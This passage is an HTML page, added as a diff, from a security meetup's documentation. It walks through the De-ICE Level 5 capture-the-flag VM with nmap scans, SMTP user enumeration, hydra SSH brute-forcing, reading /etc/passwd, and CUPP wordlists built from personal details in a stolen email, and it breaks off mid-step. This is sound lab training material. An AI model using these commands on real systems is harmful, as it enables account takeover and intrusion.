@@ -1,0 +1,837 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.4. De-ICE Level 5 &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
+        <link rel="next" title="3.5. De-ICE Level 4" href="de-ice4.html"/>
+        <link rel="prev" title="3.3. De-ICE Level 6" href="de-ice6.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">3.4. De-ICE Level 5</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#setup">3.4.1. Setup</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vm">3.4.1.1. Setting up the VM</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.4.1.2. Setting up your environment</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.4.2. Reconnaisance</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.4.2.1. Network reconnaissance</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-port-80">3.4.2.2. Reconnaissance on port 80</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#browsing-port-80">3.4.2.3. Browsing port 80</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.4.3. The Exploit</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#getting-user-id-s-for-online-password-cracking">3.4.3.1. Getting user id’s for online password cracking</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#try-user-csadmin">3.4.3.2. Try user csadmin</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#try-user-sdadmin">3.4.3.3. Try user sdadmin</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#try-user-dbadmin">3.4.3.4. Try user dbadmin</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#running-the-java-code-to-get-root-sysadmin-passwords">3.4.3.5. Running the java code to get root, sysadmin passwords</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#capturing-the-flag-as-root">3.4.3.6. Capturing the flag as root</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+      <li>3.4. De-ICE Level 5</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/de-ice5.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="de-ice-level-5">
+<span id="de-ice5"></span><h1>3.4. De-ICE Level 5<a class="headerlink" href="#de-ice-level-5" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="setup">
+<h2>3.4.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
+<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/de-ice-s1130,11/">Vulnhub De-ICE: S1.130</a>, the fifth of the Vulnhub De-ICE series. The challenge is to get the file containing new user bank account information.</p>
+<p>This De-ICE challenge is another password cracking test of patience. While none of the steps are exceptionally difficult, the online password cracking lists are big enough to take potentially many hours to try; given it’s not a sure path, many might give up on that being the correct path. Most of the time they’d be correct, but in this case not. And there’s no way to finish this exercise in anything close to 1 hour even knowing the required steps - the online password cracking takes too long.</p>
+<div class="section" id="setting-up-the-vm">
+<h3>3.4.1.1. Setting up the VM<a class="headerlink" href="#setting-up-the-vm" title="Permalink to this headline">¶</a></h3>
+<p>The VM comes packaged as the live ISO <a class="reference external" href="http://hackingdojo.com/downloads/iso/De-ICE_S1.130.iso">De-ICE_S1.130.iso</a> running SLAX 5.1.7 (based on Slackware 10.2.0). It uses fixed IP 192.168.1.20.</p>
+</div>
+<div class="section" id="setting-up-your-environment">
+<h3>3.4.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+mkdir -p <span class="nv">$PT</span>
+<span class="nb">cd</span> <span class="nv">$PT</span>
+<span class="c1"># download de-ice5_setup.sh</span>
+curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice5_setup.sh
+<span class="c1"># edit as needed; later the recon will give you TARGET IPs</span>
+<span class="nb">source</span> de-ice5_setup.sh
+</pre></div>
+</div>
+<p>The source for <code class="file docutils literal"><span class="pre">de-ice5_setup.sh</span></code> (<a class="reference download internal" href="../_downloads/de-ice5_setup.sh" download=""><code class="xref download docutils literal"><span class="pre">de-ice5_setup.sh</span></code></a>) should look something like the following.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Edit these to match your setup</span>
+<span class="c1"># *******************************************************</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.20           <span class="c1"># ip of de-ice5</span>
+<span class="nv">SUBNET</span><span class="o">=</span><span class="m">192</span>.168.1.0/24         <span class="c1"># subnet</span>
+<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.100            <span class="c1"># Kali IP</span>
+<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5      <span class="c1"># create working directories here</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>grep -c de-ice5 /etc/hosts<span class="k">)</span> -eq <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">&quot; add \&quot;</span><span class="nv">$TARGET</span><span class="s2"> de-ice5.com\&quot; to /etc/hosts&quot;</span>
+<span class="k">fi</span>
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Maybe edit these</span>
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Create some directories</span>
+<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider,sqlmap
+<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
+<span class="nv">TARGETS</span><span class="o">=</span>targets.txt
+
+<span class="c1"># *******************************************************</span>
+<span class="c1"># Don&#39;t edit these</span>
+<span class="c1"># *******************************************************</span>
+<span class="nv">HOST</span><span class="o">=</span>de-ice5.com
+<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="reconnaisance">
+<h2>3.4.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="network-reconnaissance">
+<h3>3.4.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
+<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
+
+<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
+<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
+<span class="c1"># use the grep-able output to get a list of target hosts</span>
+grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
+<span class="c1"># use the xml output to get an html report</span>
+xsltproc nmap_sn.xml -o nmap_sn.html
+</pre></div>
+</div>
+<p>Here we find the IP for de-ice5: $TARGET. Update $PT/de-ice5_setup.sh and also edit <code class="file docutils literal"><span class="pre">/etc/hosts</span></code> to add “de-ice5.com” (<code class="docutils literal"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">de-ice5.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
+
+<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
+<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
+xsltproc nmap_A.xml -o nmap_A.html
+</pre></div>
+</div>
+<p>Running this reveals:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">PORT    STATE  SERVICE  REASON         VERSION</span>
+</span><span class="hll"><span class="go">20/tcp  closed ftp-data reset ttl 64</span>
+</span><span class="hll"><span class="go">21/tcp  open   ftp      syn-ack ttl 64 vsftpd 2.0.4</span>
+</span><span class="hll"><span class="go">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+</span><span class="go">|_Can&#39;t get directory listing: Can&#39;t parse PASV response: &quot;OOPS: capset&quot;</span>
+<span class="hll"><span class="go">22/tcp  open   ssh      syn-ack ttl 64 OpenSSH 4.3 (protocol 1.99)</span>
+</span><span class="go">|_sshv1: Server supports SSHv1</span>
+<span class="hll"><span class="go">25/tcp  open   smtp     syn-ack ttl 64 Sendmail 8.13.7/8.13.7</span>
+</span><span class="go">| smtp-commands: slax.example.net Hello [192.168.1.100], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP,</span>
+<span class="go">|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &quot;HELP &lt;topic&gt;&quot;. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info</span>
+<span class="hll"><span class="go">80/tcp  open   http     syn-ack ttl 64 Apache httpd 2.0.55 ((Unix) PHP/5.1.2)</span>
+</span><span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
+<span class="go">|_http-server-header: Apache/2.0.55 (Unix) PHP/5.1.2</span>
+<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="hll"><span class="go">110/tcp open   pop3     syn-ack ttl 64 Openwall popa3d</span>
+</span><span class="hll"><span class="go">143/tcp open   imap     syn-ack ttl 64 UW imapd 2004.357</span>
+</span><span class="go">|_imap-capabilities: MAILBOX-REFERRALS STARTTLS SCAN LOGIN-REFERRALS IMAP4REV1 SORT completed CAPABILITY THREAD=ORDEREDSUBJECT MULTIAPPEND IDLE SASL-IR BINARY AUTH=LOGINA0001 UNSELECT LITERAL+ NAMESPACE OK THREAD=REFERENCES</span>
+<span class="go">443/tcp closed https    reset ttl 64</span>
+<span class="go">MAC Address: 52:54:00:27:18:8C (QEMU Virtual NIC)</span>
+<span class="go">Device type: general purpose</span>
+<span class="go">Running: Linux 2.6.X</span>
+<span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>
+<span class="go">OS details: Linux 2.6.13 - 2.6.32</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="reconnaissance-on-port-80">
+<h3>3.4.2.2. Reconnaissance on port 80<a class="headerlink" href="#reconnaissance-on-port-80" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/spider
+
+<span class="hll">dirb  http://<span class="nv">$HOST</span>/ -o dirb80_<span class="nv">$HOST</span>.txt
+</span><span class="c1"># results in</span>
+<span class="c1"># + http://de-ice5.com/cgi-bin/ (CODE:403|SIZE:295)</span>
+<span class="c1"># + http://de-ice5.com/index.php (CODE:200|SIZE:1980)</span>
+<span class="hll"><span class="c1"># + http://de-ice5.com/index2.php (CODE:200|SIZE:563)</span>
+</span><span class="c1"># + http://de-ice5.com/info.php (CODE:200|SIZE:37910)</span>
+<span class="hll"><span class="c1"># + http://de-ice5.com/~sysadmin (CODE:403|SIZE:415)</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="browsing-port-80">
+<h3>3.4.2.3. Browsing port 80<a class="headerlink" href="#browsing-port-80" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="http://de-ice5.com/index2.php">http://de-ice5.com/index2.php</a> gives an email address “<a class="reference external" href="mailto:customerserviceadmin&#37;&#52;&#48;nosecbank&#46;com">customerserviceadmin<span>&#64;</span>nosecbank<span>&#46;</span>com</a>”. This may be an alias for a real user id and so we’ll try all of EXPN, VRFY and RCPT against “customerservieadmin” and “sysadmin”, along with a user id that must exist (“root”) and one that doesn’t exist (“0 0”):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll">cat &gt;users.txt <span class="s">&lt;&lt;EOF</span>
+</span><span class="hll"><span class="s">customerserviceadmin</span>
+</span><span class="hll"><span class="s">sysadmin</span>
+</span><span class="hll"><span class="s">root</span>
+</span><span class="hll"><span class="s">0 0</span>
+</span><span class="hll"><span class="s">EOF</span>
+</span>
+<span class="hll">smtp-user-enum -M EXPN -U users.txt -t de-ice5.com
+</span><span class="hll"><span class="c1"># result - no users exist</span>
+</span><span class="hll">smtp-user-enum -M VRFY -U users.txt -t de-ice5.com
+</span><span class="hll"><span class="c1"># result - all users exist</span>
+</span><span class="hll">smtp-user-enum -M RCPT -U users.txt -t de-ice5.com
+</span><span class="hll"><span class="c1"># result - root and sysadmin exists</span>
+</span></pre></div>
+</div>
+<p>So we can only trust <code class="docutils literal"><span class="pre">smtp-user-enum</span> <span class="pre">-M</span> <span class="pre">RCPT</span> <span class="pre">...</span></code> for enumerating actual users.</p>
+</div>
+</div>
+<div class="section" id="the-exploit">
+<h2>3.4.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="getting-user-id-s-for-online-password-cracking">
+<h3>3.4.3.1. Getting user id’s for online password cracking<a class="headerlink" href="#getting-user-id-s-for-online-password-cracking" title="Permalink to this headline">¶</a></h3>
+<p>A long <strong class="program">hydra</strong> run failed to crack passwords for “root” and “sysadmin”. So use <strong class="program">smtp-user-enum</strong> to try to determine the customer service account:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll"><span class="c1"># Guess customersupportadmin account:</span>
+</span><span class="hll"><span class="c1"># Generate {c,cust,customer} x {s,sup,supp,support} x {a,ad,adm,admin}</span>
+</span><span class="k">for</span> c in c cust customer<span class="p">;</span> <span class="k">do</span>
+<span class="k">for</span> s in s sup supp support<span class="p">;</span> <span class="k">do</span>
+<span class="k">for</span> a in a ad adm admin<span class="p">;</span> <span class="k">do</span>
+<span class="hll">  <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$c$s$a</span><span class="s2">&quot;</span> &gt;&gt; users.txt
+</span><span class="k">done</span>
+<span class="k">done</span>
+<span class="k">done</span>
+<span class="hll">smtp-user-enum -M RCPT -U users.txt -t de-ice5.com
+</span><span class="hll"><span class="c1"># results in</span>
+</span><span class="hll"><span class="c1"># de-ice5.com: csadmin exists</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="try-user-csadmin">
+<h3>3.4.3.2. Try user csadmin<a class="headerlink" href="#try-user-csadmin" title="Permalink to this headline">¶</a></h3>
+<p>So let’s try and crack “csadmin”:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll">hydra -F -l csadmin -P /usr/share/wordlists/nmap.lst -t <span class="m">2</span> de-ice5.com ssh
+</span><span class="hll"><span class="c1"># results in</span>
+</span><span class="hll"><span class="c1"># [22][ssh] host: de-ice5.com   login: csadmin   password: rocker</span>
+</span></pre></div>
+</div>
+<p>A little reconnaissance using csadmin gives three items of interest: user ids from <code class="file docutils literal"><span class="pre">/etc/passwd</span></code>, the encrypted flag file <code class="file docutils literal"><span class="pre">/home/ftp/incoming/useracc_update.csv.enc</span></code>, and two mail files in <code class="file docutils literal"><span class="pre">mailserv_download/</span></code>:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">ssh csadmin@de-ice5.com    # password &#39;rocker&#39;</span>
+</span><span class="hll"><span class="go">cat /etc/passwd</span>
+</span><span class="gp">#</span> results in
+<span class="gp">#</span> root:x:0:0::/root:/bin/bash
+<span class="hll"><span class="gp">#</span> sysadmin:x:1000:10:,,,:/home/sysadmin:/bin/bash
+</span><span class="hll"><span class="gp">#</span> dbadmin:x:1001:100:,,,:/home/dbadmin:/bin/bash
+</span><span class="hll"><span class="gp">#</span> sdadmin:x:1002:100:,,,:/home/sdadmin:/bin/bash
+</span><span class="hll"><span class="gp">#</span> csadmin:x:1003:100:,,,:/home/csadmin:/bin/bash
+</span><span class="hll"><span class="gp">#</span> Show the flag data:
+</span><span class="hll"><span class="go">ls -l /home/ftp/incoming/useracc_update.csv.enc</span>
+</span><span class="hll"><span class="gp">#</span> Show the email data:
+</span><span class="hll"><span class="go">ls -l $HOME/mailserv_download/</span>
+</span><span class="gp">#</span> returns
+<span class="hll"><span class="gp">#</span> -rw-r--r-- <span class="m">1</span> csadmin users  <span class="m">1186</span> Dec <span class="m">30</span>  <span class="m">2010</span> <span class="m">2010122014234</span>.j12Gqo4H049241
+</span><span class="hll"><span class="gp">#</span> -rw-r--r-- <span class="m">1</span> csadmin users <span class="m">25462</span> Dec <span class="m">30</span>  <span class="m">2010</span> <span class="m">2010122216451</span>.f81Ltw4R010211.part2
+</span><span class="gp">#</span> see the java code
+<span class="go">strings $HOME/mailserv_download/2010122216451.f81Ltw4R010211.part2</span>
+<span class="gp">#</span> see the email
+<span class="go">file $HOME/mailserv_download/2010122014234.j12Gqo4H049241</span>
+<span class="gp">#</span> returns
+<span class="gp">#</span> /home/csadmin/mailserv_download/2010122014234.j12Gqo4H049241: ASCII mail text
+<span class="go">cat $HOME/mailserv_download/2010122014234.j12Gqo4H049241</span>
+<span class="go">exit</span>
+</pre></div>
+</div>
+<p>Running <code class="docutils literal"><span class="pre">strings</span> <span class="pre">2010122216451.f81Ltw4R010211.part2</span></code> shows it has embedded Java code, but it’s only “part2”. Displaying <code class="file docutils literal"><span class="pre">2010122014234.j12Gqo4H049241</span></code> shows it’s mail text:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">To: csadmin@nosecbank.com</span>
+<span class="go">CC:</span>
+<span class="go">Subject: My Son&#39;s Birthday</span>
+<span class="hll"><span class="go">Date: Mon, 20 Dec 2010 14:23:46 +0500</span>
+</span><span class="hll"><span class="go">Return-Path: &lt;sdadmin@nosecbank.com&gt;</span>
+</span><span class="go">Delivered-To: csadmin:nosecbank.com@nosecbank.com</span>
+<span class="go">Received: (qmail 20281 invoked from network); 20 Dec 2010 09:23:46 -0000</span>
+<span class="go">X-Received: from network (192.168.1.123) by mailserv1-3.us6.service.com;</span>
+<span class="go">20 Dec 2010 09:23:46 -0000</span>
+<span class="go">Received: from www.nosecbank.com (unknown [198.65.139.34]) by</span>
+<span class="go">srv5.us6.service.com (Postfix) with ESMTP id D98402459DD for</span>
+<span class="go">&lt;csadmin@nosecbank.com&gt;; Mon, 20 Dec 2010 09:23:46 +0000 (GMT)</span>
+<span class="go">Message-Id: &lt;2010122014234.j12Gqo4H049241@www.nosecbank.com&gt;</span>
+<span class="go">Mime-Version: 1.0</span>
+<span class="go">Content-Type: multipart/alternative;</span>
+<span class="go">boundary=&quot;---=_NextPart_000_0000_02F24S11.FEPQRE80&quot;</span>
+<span class="go">X-Mailer: K-Mail; Build 1.0.5510</span>
+<span class="go">Thread-Index: Qw2cWVmE3odZs3TqTTqFvS1e3lexms==</span>
+<span class="go">Message: Hey Mark, I am curious if you would be free to come over and</span>
+<span class="hll"><span class="go">visit for my son Donovin&#39;s birthday tomorrow after work.  I would also</span>
+</span><span class="hll"><span class="go">appreciate if you brought Andy with you as well, because Donny</span>
+</span><span class="go">really enjoyed playing with him last time he was over.  I know its short</span>
+<span class="hll"><span class="go">notice but he is turning 12 and it is special for both him and me. Let</span>
+</span><span class="hll"><span class="go">me know if this works. Thanks!  -Paul</span>
+</span></pre></div>
+</div>
+<p>This email is from sdadmin to csadmin. Perhaps we should turn our attention to sdadmin.</p>
+</div>
+<div class="section" id="try-user-sdadmin">
+<h3>3.4.3.3. Try user sdadmin<a class="headerlink" href="#try-user-sdadmin" title="Permalink to this headline">¶</a></h3>
+<p>A normal <strong class="program">hydra</strong> run trying to crack sdadmin’s password fails. So we’ll try <a class="reference external" href="https://github.com/Mebus/cupp">Mebus/cupp</a> to generate password guesses:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice5
+<span class="nb">source</span> <span class="nv">$PT</span>/de-ice5_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="hll"><span class="c1"># First download CUPP</span>
+</span>curl --silent --insecure --remote-name <span class="se">\</span>
+  https://raw.githubusercontent.com/Mebus/cupp/master/cupp.py
+curl --silent --insecure --remote-name <span class="se">\</span>
+  https://raw.githubusercontent.com/Mebus/cupp/master/cupp.cfg
+
+<span class="hll"><span class="c1"># Generate passwords for sdadmin using CUPP</span>
+</span>python cupp.py -h
+<span class="hll">python cupp.py -i
+</span><span class="hll"><span class="c1"># non-default values entered</span>
+</span><span class="hll"><span class="c1"># &gt; First Name: Paul</span>
+</span><span class="hll"><span class="c1"># &gt; Child&#39;s name: Donovin</span>
+</span><span class="hll"><span class="c1"># &gt; Child&#39;s nickname: Donny</span>
+</span><span class="hll"><span class="c1"># &gt; Child&#39;s birthdate (DDMMYYYY): 21121998</span>
+</span>
+<span class="hll"><span class="c1"># Try and crack sdadmin</span>
+</span><span class="hll">hydra -F -l sdadmin -P paul.txt -t <span class="m">2</span> de-ice5.com ssh
+</span><span class="hll"><span class="c1"># results in</span>
